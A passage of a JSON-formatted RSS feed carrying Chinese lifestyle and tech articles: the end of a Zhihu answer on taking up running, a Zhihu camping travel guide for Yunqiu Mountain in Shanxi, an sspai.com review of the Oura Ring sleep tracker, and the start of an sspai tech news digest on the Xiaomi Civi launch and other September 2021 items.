data-original-src=\"v2-5ae06b4c6fbe8ec4ed58621a35b0292a\" data-watermark-src=\"v2-fbcf41511c9ff34fc368eee0cba44b33\" data-private-watermark-src=\"v2-c13cb5da7977f0c90d2a20d1328fc29f\"></p>\n<p>我现在每天大概10点半就睡了，晚睡即使起来了也跑不动。</p>\n<p>跑步以后吃饭也特别规律，之前饮食不规律导致的肠胃不好的毛病也被每天按时吃饭给治好了。</p>\n<p>我们普通人跑步也不是为了成为专业运动员，出于各种各样的原因，都是为了改变自己的生活。<b>跑步本身是服务于生活，而不是生活服务于跑步。</b></p>\n<p><b>想清楚了这点再去跑步可能会更好一些，所以在知乎做跑步领域博主，主要也是让大家从跑步中收获快乐，希望自己的经历可以帮助到大家，让大家少走一些弯路。</b></p>\n<p><b>我不是跑的快的，比我跑的快的人太多太多了；</b></p>\n<p><b>也不是最懂跑步的，专业教练的跑步知识比我丰富太多了；</b></p>\n<p>我只是从一个小白自己摸索跑步到今天，跑了十多场马拉松。自考急救证书做了马拉松急救跑者，报名佳明跑步教练，希望能学到更加系统的跑步知识。</p>\n<p><b>唯一的优势可能就是：我是从一个跑200米要在床上躺一天的人，到今天能跑完全程马拉松PB350，更懂普通跑步爱好者会遇到的问题吧。</b></p>\n<p>所有最开始的「坚持」，如果坚持到最后都会变成一种习惯或者一个爱好。</p>\n<p><br></p>\n<p><b>现在超过3天不跑步就会心慌，1周不跑步简直不能忍，下大暴雨也要出去跑，走到哪里跑鞋都是第一时间放在行李箱里的物品。</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tan-suo-19?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Seeker</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488147269/answer/2134724586?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">164 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/313034548?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">我现在对自己的生活特别不满意，不知道如何改变，无论是工作还是生活，你是如何改变成功的？</a><br><a href=\"http://www.zhihu.com/question/329023077?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有什么事情坚持下来，会给你的生活带来改变，又是什么改变？</a><br>\n","link":"http://www.zhihu.com/question/488147269/answer/2134724586?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"哪一程的旅行满足了你对「去远方」的美好幻想？","date":"2021-09-28 03:31:07","description":"\n<p>很高兴回答这个问题。</p>\n<p>我是<b>爸爸爱露营</b>的老常。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e0c598423caa2a75898abc375b8a3cb8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3358\" data-rawheight=\"1888\" data-watermark=\"watermark\" data-original-src=\"v2-e0c598423caa2a75898abc375b8a3cb8\" data-watermark-src=\"v2-8f4fb5a52b315464be1e8d1029acf22f\" data-private-watermark-src=\"v2-3389475be992c4733370fda59b99a9ae\"></p>\n<p>其实，现在的疫情，让我们很难做到真正的“去远方”，而且这个状态，可能会持续2-3年，甚至更久，作为旅行爱好者的我和很多朋友，不得不接受这个事实。</p>\n<p>所以，现在的“去远方”，更多，<b>是一种状态</b>，我希望可以看到这个回答的你，有机会在这疫情持续的几年间，完成自己想要的“去远方”。</p>\n<hr>\n<p>对，熟悉我的朋友知道，我又要来安利露营了，哈哈哈哈哈！</p>\n<p>好了，回到问题中来，我经历了那么多次露营，我就谈让我印象最为深刻的，就是去到位于山西省临汾市的<b>云丘山景区露营</b>。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-66c6e13e5e104e5887ec175f480372a7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3036\" data-rawheight=\"1706\" data-watermark=\"watermark\" data-original-src=\"v2-66c6e13e5e104e5887ec175f480372a7\" data-watermark-src=\"v2-cf6952b8052b376276e804663d1c1678\" data-private-watermark-src=\"v2-e8eefedf198e746cef16942a1c34d4df\"></p>\n<p>广东的炎热，对于和大自然零距离接触的户外露营来说，非常不友好。炎热也是诸多因素中，最为制约露营的一个因素。所以来到云丘山之后，我们的第一感受就是</p>\n<p><b>啊~~~~~~~~太TM舒服了~！！！！！</b></p>\n<hr>\n<p>首先谈交通，如果是乘飞机过来，建议直飞山西运城张孝机场，航班会比较多，如果是高铁，最近的是侯马站，第二选择是临汾西。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2c0e878fa4a41f14a4ffbc72c445dc66_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3028\" data-rawheight=\"1698\" data-watermark=\"watermark\" data-original-src=\"v2-2c0e878fa4a41f14a4ffbc72c445dc66\" data-watermark-src=\"v2-87eb1919d2ce8a68d71105359ef29405\" data-private-watermark-src=\"v2-6a02370d919767178109437ebc68a86b\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8c6022077bb2aaf8848082075fe0f724_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"1696\" data-watermark=\"watermark\" data-original-src=\"v2-8c6022077bb2aaf8848082075fe0f724\" data-watermark-src=\"v2-f9ddbcb19a4c60d344f47c8c6137f972\" data-private-watermark-src=\"v2-c54a6de942d230267c26c25dbc4fe748\"></p>\n<p>其次谈一下住宿，毕竟很多朋友不全是为了露营而来，这里的住宿选择主要有两种，第一种是<b>窑洞大院</b>，就是经常在电视上看到的，黄土高坡的特色建筑，但是这里的窑洞是砖窑，不是泥窑，但也是冬暖夏凉的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6788a38e05b6cf4badb86331ebfe1aff_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3026\" data-rawheight=\"1690\" data-watermark=\"watermark\" data-original-src=\"v2-6788a38e05b6cf4badb86331ebfe1aff\" data-watermark-src=\"v2-ccc9e02a38dec742046092f56f4115ba\" data-private-watermark-src=\"v2-898d77eaca3cb703991752b9e8653d8d\"></p>\n<p>第二种是<b>康家坪民宿</b>，绝大部分房子是清代建筑历史悠久，有几百年的历史，而且很多是独门独户配有小院子，特别适合一家几口过来一起住。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4e84f5e933e700ceef2455c523a9d129_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3038\" data-rawheight=\"1696\" data-watermark=\"watermark\" data-original-src=\"v2-4e84f5e933e700ceef2455c523a9d129\" data-watermark-src=\"v2-355942bfbbb865dcd7b7266e931e650b\" data-private-watermark-src=\"v2-293b1ea8d2684955cd9db0763e1c75c7\"></p>\n<p>然后是这里的美食，可以吃饭的地方有几个选择，第一是山珍院，特色是养生汤锅，所有的食材都是山里自己养的，特别是土猪肉，超级正。第二是八宝食府，特色是养生野菜和山西面食。第三是康家坪的水席院，超多小吃吃起来很爽，特别适合吃货。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-81c233e7f2025668d82de36dee4cce1b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3030\" data-rawheight=\"1694\" data-watermark=\"watermark\" data-original-src=\"v2-81c233e7f2025668d82de36dee4cce1b\" data-watermark-src=\"v2-54b156e244c107da250f4841bd66de99\" data-private-watermark-src=\"v2-8e734def87750164554f4a45e8025594\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d793b8db18c402af6288a76f0f089c32_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3028\" data-rawheight=\"1700\" data-watermark=\"watermark\" data-original-src=\"v2-d793b8db18c402af6288a76f0f089c32\" data-watermark-src=\"v2-f13a962d7b878f9f6cf5b647495fea6e\" data-private-watermark-src=\"v2-e6bf213ffdb007cd8a0d450a1040aa6f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a080e675f76e49124e4572bad7c315c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3036\" data-rawheight=\"1696\" data-watermark=\"watermark\" data-original-src=\"v2-a080e675f76e49124e4572bad7c315c2\" data-watermark-src=\"v2-743dacccf81c4873383abe575b41bce2\" data-private-watermark-src=\"v2-5a51f9752d9155fc64acb0490186b4db\"></p>\n<p>最后聊一下<b>可以露营的场地</b>。</p>\n<p>这里的露营品牌叫<b>苍里露营</b>，位于景区中间，民宿群下面大概走路10分钟的一片草地。这片场地东西是山，形成了峡谷的天然地势，南北是日落日出的方向，白天太阳直晒还是会有些热，但是有穿堂风，到了晚上，8月的温度只有10-15℃，另一位爸爸Donald要穿2-3件。我们晚上点起了篝火保持温暖。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1b28e06394c8815bc8a5962f5c56d331_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3034\" data-rawheight=\"1700\" data-watermark=\"watermark\" data-original-src=\"v2-1b28e06394c8815bc8a5962f5c56d331\" data-watermark-src=\"v2-155c7f3676d3952b7bd84559ac14233b\" data-private-watermark-src=\"v2-aaca8544bf27a253dfbf9c0b326aba01\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dea89175b110eff41c9f90e2334f3288_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3028\" data-rawheight=\"1702\" data-watermark=\"watermark\" data-original-src=\"v2-dea89175b110eff41c9f90e2334f3288\" data-watermark-src=\"v2-b5b6067f43a63f656b37d97094056602\" data-private-watermark-src=\"v2-64390a504e43e6985d6f93940bf2c76e\"></p>\n<p>场地保养的非常好，做了驱蛇和驱虫，走路2分钟就有冲凉房和洗手间，而且卫生条件非常赞，对于第一次想要体验露营的朋友，这里不仅提供了帐篷租赁，直接可以拎包入住，而且还提供了公共水电，可以租借移动电源。营地的旁边是希望农场可以自己去采摘新鲜的蔬菜来烹饪，如果是带一家老小来旅游，完全可以在旅程中间穿插一晚的露营体验。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c92aa3511c4494b5d401525b7b2140e5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3014\" data-rawheight=\"1696\" data-watermark=\"watermark\" data-original-src=\"v2-c92aa3511c4494b5d401525b7b2140e5\" data-watermark-src=\"v2-370bf90e6c3c953999c17539775eedee\" data-private-watermark-src=\"v2-32f8e56ebfa935052d0cb96f409cec30\"></p>\n<p>对了，这有还有<b>景点</b>，比如塔尔坡古村落的小吃和风土人情，还有全球三大冰洞之一的冰洞。如果想体验特色的住宿，还有超级科技感的太空舱可以选择。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a80a0dd609380d91e0bc22794196b66d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3032\" data-rawheight=\"1704\" data-watermark=\"watermark\" data-original-src=\"v2-a80a0dd609380d91e0bc22794196b66d\" data-watermark-src=\"v2-d9d5dbd014bf8684d2bde9233c12d515\" data-private-watermark-src=\"v2-7b77dc9d98c25bc545a3fa6fa0e061d5\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-451da3f0f34e263ddf1f528fa7feea40_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3028\" data-rawheight=\"1694\" data-watermark=\"watermark\" data-original-src=\"v2-451da3f0f34e263ddf1f528fa7feea40\" data-watermark-src=\"v2-77e16e95b1482426e91972e9a0836908\" data-private-watermark-src=\"v2-6f6675fe2c03244ef6c9f9ac06cf71f6\"></p>\n<p>所以，<b>如果你想要去一个『远方』，来达成一家人都有的旅途愿望，顺便体验一下露营</b>，我的回答，对您应该有所帮助。</p>\n<p>这个景区我做了视频版攻略，你不妨了解一下</p>\n<a href=\"https://www.zhihu.com/zvideo/1415054857221337088\">2021的十一长假你打算去哪里？给你露营+民宿+美食+景点的宝藏目的地攻略！</a>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ba-ba-ai-lu-ying?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">爸爸爱露营</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488102063/answer/2143628024?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">110 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/488083809?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在路上的哪个瞬间让你发现「旅行成为疲惫生活中的一束光」？</a><br><a href=\"http://www.zhihu.com/question/480833407?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去哪里旅行能重燃生活的希望？</a><br>\n","link":"http://www.zhihu.com/question/488102063/answer/2143628024?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"戴在手指上的可穿戴设备，能帮你睡个好觉吗？Oura Ring 体验报告","date":"2021-09-28 03:29:15","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>上手 Oura Ring 两个月了，非常喜欢，也给我的生活带来了实质的改变。一开始觉得不就记录一下睡眠数据嘛，没什么特别的，可是用着用着就感觉像在建立一段关系，在潜移默化中被影响，一开始不当回事，现在是服服帖帖。</p>\n<p>首先声明我的测评肯定不客观，智能穿戴设备我就只有使用多年的 Garmin Forerunner 235，跟睡眠有关的应用 Sleep Cycle 倒是很早就开始用。好像中文介绍 Oura Ring 的文章并不多，这里更多是想分享一下我自己的感受以及它给我带来的变化。</p>\n<h2>为什么尝试</h2>\n<p>最开始听到 Tim Ferris 在<a href=\"https://podclips.com/c/aTSNHU?ss=r&amp;ss2=ouraring&amp;d=2021-01-21\">一次 Podcast 里说</a>，Oura 显示多喝两杯酒 “turns your sleep into garbage”.</p>\n<p>不过我自己买也不完全是因为睡眠，因为我（天真地）以为自己的睡眠很好（混淆了入睡容易和睡得好是两个概念），也不太相信一个小戒指能怎么带来改变。我主要是想长期跟踪一些指标。最近看了 <a href=\"https://www.amazon.com/Lifespan-Why-Age-Dont-Have-ebook/dp/B07N4C6LGR\"><i>Lifespan</i></a> 这本书开始关注 longevity，希望在运动和饮食等方面作出改变，就想找一些可以长期 track 的指标。Garmin 可以记录运动时的 VO2 Max，但像Resting Heart Rate(RHR) 和 Heart Rate Variability (HRV) 这些指标需要睡觉的时候测（看到了<a href=\"https://twitter.com/davidasinclair/status/1187767072236941315?s=20\">David Sinclair 发的 tweet</a>），而手表的话太大戴着睡觉很不舒服。</p>\n<p>研究了一段时间后觉得这个小戒指还挺靠谱的。<a href=\"https://time.com/collection/best-inventions-2020/5911381/oura-ring/\">NBA</a>、<a href=\"https://ouraring.com/blog/oura-usa-surfing-olympic-debut/\">USA Surfing</a> 运动员都在用，<a href=\"https://ouraring.com/blog/ucsd-pregnancy-study/\">UCSD还拿它来做研究</a>。想着买来试一下，反正 30 天内可以退...</p>\n<h2>优秀的交互和体验</h2>\n<p>对于 Ring 本身，体验很好，戴着不怎么碍事，毕竟没有屏幕和按钮。续航能有五六天，每天洗澡的时候正好充充电。</p>\n<p>App 使用起来也非常舒服，简单却很强大。信息分为三个类别：Readiness，Sleep，Activity，每天会给三个分数来评估自己的状态。UI和信息的呈现方式特别棒。而且不只是呈现原始数据，还会进行分析并给出行动建议：要达到今天的 active calories，我可以走 3.5 km（图1）；昨天 RHR 很晚才降下来，有没有可能吃饭太晚了（图2）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/9ac72e0567644077be4030e77a3bc8c6.jpeg\"><figcaption>Oura app 主要界面（左二图），Gamin Connect app 主要界面（右图）</figcaption></figure><p>相比之下 Garmin 的 Connect app 显示的都是原始数据，图2显示我的目标是 6360 步，我就没搞懂<a href=\"https://www.nytimes.com/2021/07/06/well/move/10000-steps-health.html\">为什么一定要走这么多步数</a>。有评论说 Garmin 像一个会计，Oura 像一个教练，很贴切。</p>\n<p>基本上所有活动都能自动监测的。去散一会儿步，它会在 app 里自动生成，需要做的只是确认，散步、跑步、爬山这些运动的检测都挺准的，相比之下 Garmin 需要自己设定开始和结束（我爬完山经常忘记关）。除了运动，午睡(Nap) 也能自动监测，如果只是躺了一会儿没睡着的话会显示 Rest。</p>\n<p>Presence 功能很有意思（图4），可以监测冥想时候心率和体温的变化（图5）。我注意到要是我一开始心比较静，后来被什么情绪打扰了，我的体温会有明显的下降。我以前没意识到自己的心理能这么直接地影响身体指标。有一天我自己感觉身体有点发热，第二天醒来就跟我说我体温有点高，要不要休息一下（图6），非常贴心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/4497de70b6953c9bd0624872dadc6dab.jpeg\"><figcaption>Oura app 的 Presence 功能（左二图），贴心的提醒（右图）</figcaption></figure><p>总体来说就是我需要的时候可以舒服地在 app 里查看我想知道的所有信息，不需要的时候不会来烦我。还有一些细节：每一个指标都有清晰的解释（是什么、有变化之后意味着什么）；同步很快，而且离线也可以（我在山里露营没信号的时候 Garmin 就不能同步到手机里）。</p>\n<h2>睡眠指导</h2>\n<p>在使用一两周后收到提醒说找到了我理想的上床时间，图 2 可以看到是 10:15 PM - 11:30 PM，然后 app 每天会提前两个小时，也就是 8:15 PM 的时候提醒我 \"Your bedtime is approaching...\" 一开始看到的我感觉简直搞笑，8 点多就叫我准备睡觉了？！</p>\n<p>后来因为两件事我开始听它的了。</p>\n<p>很多测评没有提到，除了在 app 上能看数据外，<a href=\"https://support.ouraring.com/hc/en-us/articles/360025587353-Use-Oura-on-the-Web\">还有一个网站</a>可以更加方便地探索。我发现我的睡眠分数和入睡时间强烈负相关：睡得越晚，分数越低（图7）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/c13df84d615aeb2d00f4193b0a9d0a9c.jpeg\"><figcaption>Oura 网站提供的睡觉时间和睡眠分数的分析</figcaption></figure><p>还读了 <i>Why We Sleep</i> 这本书（强烈推荐），意识到不好好睡觉就是慢性自杀，会让自己变笨，提高患多种疾病的风险……现代人的生活方式有很多是影响睡眠的，比如说蓝光。我也知道蓝光影响睡眠，但有多影响？书中讲到，相比于睡觉前看纸质书，用 iPad 读书会让褪黑素的分泌最多推迟三个小时，分泌量也会减少一半以上。不仅如此，用 iPad 的人还会产生更少的 REM 睡眠，白天觉得更累，在停止这个行为后褪黑素的分泌要好几天才能恢复正常。</p>\n<p>我意识到，8 点多的提醒也不是叫我马上睡觉，而是开始放松和静下来，不做影响睡眠的事情。后来我到八九点就尽量避免一切屏幕，读一些让人安静下来的书，睡前洗一个热水澡，十一点左右自然就困了。经过几周的调整，我现在每天 7 点多能自然醒，在图 8 能看到睡眠分数明显提高了（红线）。</p>\n<p>相对于 Sleep Cycle 这些仅靠声音来监测睡眠的 app，Oura 显然要准确很多。不仅如此，Oura 还能区分出 REM 睡眠和 NREM 睡眠，NREM 又包括 Light 和 Deep。<a href=\"https://ouraring.com/blog/sleep-score/\">给出的睡眠分数</a>也靠谱很多，而对于 Sleep Cycle 我感觉只要睡得越久，给的分就越高。不过 Sleep Cycle 有一点好的是可以记录打鼾情况。当然这个比较肯定是不公平的，毕竟价格差那么多。</p>\n<p>除了自动生成的数据，app 还支持给每天加 tag 和 notes，比如 caffeine, alcohol, late meal 这些，有助于发现自己的行为对身体的影响。</p>\n<h2>Oura 不适合的</h2>\n<p>对 Oura 的负面评价主要来自于对运动的支持非常有限。没法实时查看自己的运动时的心率等状态。去健身房举铁的时候我也会取下来避免磨损。这些我都可以理解，毕竟这么小又没有屏幕。好在它能从 Apple Health 里读数据，所以如果白天不戴，其他设备的数据也会被 Oura 读入来决定每天的分数。</p>\n<p>我自己全天戴还是有一些收获，主要意识到自己平时的运动量实在是太少了，一开始觉得每天 500 卡怎么这么高，搜了一下别人都是说怎么这么低一上午就达到了……还有 inactive time 也有帮助，我打算再多探索一下自己的数据。</p>\n<h2>是否值得买</h2>\n<p>$299 真的不便宜。但 Matthew Walker 在 <i>Why We Sleep</i> 说，\"Sleep is <i>the</i> universal health care provider\"。想起我以前看过 Sleep Medicine 医生，一小时聊天就花了一百多刀。看到它给我带来的改变以及长远来说对健康的影响，它的性价比都不能拿钱来衡量了。当然，它本身只是展示一些数据，提出一些建议，要做出改变的还是自己。</p>\n<p>关于是否值得买我想提供两个思考的角度。</p>\n<p>Peter Attia 在谈到怎么决定要不要对健康采取干预手段 (<a href=\"https://peterattiamd.com/ama26/\">\"framework when considering different interventions\"</a>) 时提到了三点：</p>\n<ol>\n<li>做这件事产生危害的风险有多高？(What is the risk of harm from doing this thing?)</li>\n<li>如果做这件事，获得好处的可能性是多少？(If you do X, what is the probability of benefit?)</li>\n<li>机会成本有多少？(What’s the opportunity cost of this intervention?)</li>\n</ol>\n<p>另一个角度是如果你很在意自己的睡眠又很有决心来以实际行动改善（不需要看医生的那种），那么我觉得很值得。如果你不在意自己的睡眠，推荐阅读 <i>Why We Sleep.</i></p>\n<p><strong>更多阅读</strong></p>\n<p>测评</p>\n<ul>\n<li><a href=\"https://blog.douchi.space/?p=365\">一个贴心的睡眠教练，但也仅限于此 - 椒盐鸵鸟</a></li>\n<li><a href=\"https://www.wired.com/review/oura-ring/\">Oura Ring Review: Worth the Hype - WIRED</a></li>\n<li><a href=\"https://www.nytimes.com/wirecutter/reviews/oura-ring-sleep-tracker/\">The Oura Ring Is a $300 Sleep Tracker That Provides Tons of Data. But Is It Worth It? - NYTimes</a></li>\n</ul>\n<p><i>Why We Sleep</i></p>\n<ul>\n<li>\n<a href=\"https://www.amazon.com/Why-We-Sleep-Unlocking-Dreams-ebook/dp/B06ZZ1YGJ5\">Amazon.com</a>, <a href=\"https://book.douban.com/subject/35332778/\">豆瓣</a>\n</li>\n<li><a href=\"https://book.douban.com/review/10057162/\">推荐 pluskid 的书评</a></li>\n<li><a href=\"https://www.gatesnotes.com/Books/Why-We-Sleep\">和 Bill Gates 写的</a></li>\n</ul>\n<p>笔者以「探寻如何更好地生活」为主题写一份 Newsletter，<a href=\"https://newsletter.weichen.blog/\">欢迎在这里免费加入</a>。本文最早发布于 <a href=\"https://weichen.blog/oura-ring/\">weichen.blog</a>，这里稍有修改。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派会员？<a href=\"https://sspai.com/prime\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/68997"},{"title":"派早报：小米正式发布小米 Civi 手机，Apple Music 国区更新「广播」页面等","date":"2021-09-28 01:01:50","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>小米正式发布小米 Civi 手机</h3>\n<p>小米于 9 月 27 日下午召开「一场天生好看的科技发布会」，正式发布了小米 Civi 手机，外观方面，该机共有怦怦粉、轻轻蓝、闪闪黑三种配色，机身采用丝绒 AG 玻璃，1.4mm 金属中框、手机宽度低至 71.5mm，厚度 6.98mm；拥有 4500mAh 超大电量，还支持 55W 超级秒充，45 分钟即可充至 100%。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c596grlb34tehi7lc500.jpeg\"></figure><p>影像方面，小米 Civi 前置 3200 万高清镜头，支持 AF 自动对焦，前置双柔光灯配合屏幕柔光环，自带聚光灯。同时还有像素级肌肤焕新美颜黑科技；后置 AI 三摄主角相机，6400 万像素高清主摄、超广角、微距，三颗镜头覆盖日常场景，其主角镜头支持大光圈模式。</p>\n<p>屏幕方面，小米 Civi 采用 6.55 英寸 3D 微曲 OLED 柔性屏，支持 120 Hz 刷新率、240 Hz 触控采样率，拥有 402 PPI、真 10 bit 色彩，峰值亮度为 950 nit。</p>\n<p>性能方面，小米 Civi 搭载骁龙 778G 芯片，采用 6 纳米旗舰级工艺制程，8 核高性能。拥有塔式散热加持，搭载最新一代智能温控系统，9 层石墨烯均温板堆叠，该手机还支持 VRS 可变分辨率渲染。</p>\n<p>价格方面，8+128 GB 配置，2599 元；8+256 GB 配置，2899 元；12+256 GB 配置，3199 元，9 月 27 日 15:00 开启预售，9 月 30 日全渠道开售。</p>\n<p>发布会同期发布了新款智能手表 Xiaomi Watch Color 2 和小米真无线降噪耳机 3 Pro，售价分别为 999 与 699 元。<a href=\"https://weibo.com/xiaomishouji\" target=\"_blank\">来源</a></p>\n<h3>Apple Music 国区更新「广播」页面</h3>\n<p>9 月 27 日，Apple Music 国区「广播」页面更新，前身为 Beats 1 的 Apple Music 电台上线国区。首发节目为艺人独家访谈《The Zane Lowe Show》，未来将有更多节目陆续上线。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c596grtb34tehr0hghkg.png\"></figure><h3>iPhone 13 无法用 Apple Watch 解锁的问题将被修复</h3>\n<p>9 月 27 日，Apple 更新官网公告，已确认到有关近期用户反馈的 Apple Watch 无法解锁 iPhone 13 系列手机的问题，并确认将在近期的版本更新修复该问题。<a href=\"https://support.apple.com/en-us/HT212828\" target=\"_blank\">来源</a></p>\n<h3>乐视正式发布 S1 智能手机</h3>\n<p>9 月 27 日，乐视召开媒体见面会，正式宣布乐视手机的回归，并发布回归后的第一款手机产品 S1，该手机采用 720P 级别的水滴屏，搭载虎贲 T7510 芯片，内置了华为账号体系，所涉及的内容均由国产供应商提供。<a href=\"https://www.ithome.com/0/577/909.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c596gsdb34teho7gri3g.png\"></figure><h3>电力供应紧张导致 Apple 和特斯拉的多家重要供应商中国厂区停产</h3>\n<p>由于电力供应持续紧张导致部分省市采取的限电措施，导致Apple、特斯拉的几家关键供应商已经宣布中国厂区停产，其中乙盛精密工业周日表示，该公司在江苏昆山市的工厂从周日到周五暂停了生产，停工期间暂以库存维持运营；印刷电路板供应商欣兴电子表示，公司位于苏州和昆山的工厂也需要从周日中午到本月底停止生产；苹果的声学元件供应商康而富控股，在苏州设有厂房，也公告停工 5 日至周四中午，将调用库存以满足客户需求。而在新款 iPhone 等电子产品旺季到来期间，供应链的稳定性将面临风险。<a href=\"https://www.ithome.com/0/577/784.htm\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>部分用户反馈 iPad mini 出现果冻屏现象，在画面滑动的时候会出现更新率不同步的情况，导致部分画面比较卡顿和滞后。<a href=\"https://cn.engadget.com/apple-ipad-mini-6-jelly-scrolling-040024696.html\" target=\"_blank\">来源</a>\n</li>\n<li>据天风国际分析，M1 版本的 MacBook Air 和 MacBook Pro 因零组件短缺等问题，出货量或将减少 15%。<a href=\"http://finance.eastmoney.com/a/202109272121233613.html\" target=\"_blank\">来源</a>\n</li>\n<li>著名爆料人 Mark Gurman 与郭明錤近日分别称 iPhone 14 将「完全重新设计」，可能采用挖孔屏替代目前的刘海屏。<a href=\"https://cn.engadget.com/apple-iphone-14-redesign-leak-013043657.html\" target=\"_blank\">来源</a>\n</li>\n<li>由于近期的芯片短缺，三星可能取消 Galaxy S21 FE 的发布，优先满足销售正劲的 Z Fold 3 与 Z Flip 3。<a href=\"https://www.androidauthority.com/samsung-galaxy-s21-fe-canceled-3030690/\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<ul>\n<li>📖 Apple 发布会上没有「One More Thing」？我们给你备上了：《少数派系统指南 · iOS 15》上架预购八折优惠中，更多介绍请前往 <a href=\"https://sspai.com/series/228\" target=\"_blank\">栏目页面</a> 查看。</li>\n<li>\n<a href=\"https://emojipedia.org/mobile-phone/\" target=\"_blank\">📱</a> 你有同时用两部手机的习惯或者经历吗？不妨去 <a href=\"https://sspai.com/bullet/1632293763\" target=\"_blank\">一派</a> 和大家聊聊你是怎么用它们。</li>\n<li>🦦 十一将至，贴心水獭为即将出门远行的你带来了些 <a href=\"https://sspai.com/post/68979\" target=\"_blank\">好东西</a>。</li>\n<li>🎁 少数派会员增刊<a href=\"https://sspai.com/prime/precog/sp-0x00\" target=\"_blank\">《科技漫游》第〇期已经发布</a>，会员群、知识库同期上线，<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=641648482116\" target=\"_blank\">现在购买</a> 可获赠价值 40 元的白描黄金版。</li>\n<li>🎉 少数派正版软件商城 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">开学季促销</a> 继续进行中，数十款优质软件低至 5 折起。</li>\n<li>📕 由少数派编辑部联合优秀作者出版实体书《数字时代的效率手册》上线电商平台，立即前往 <a 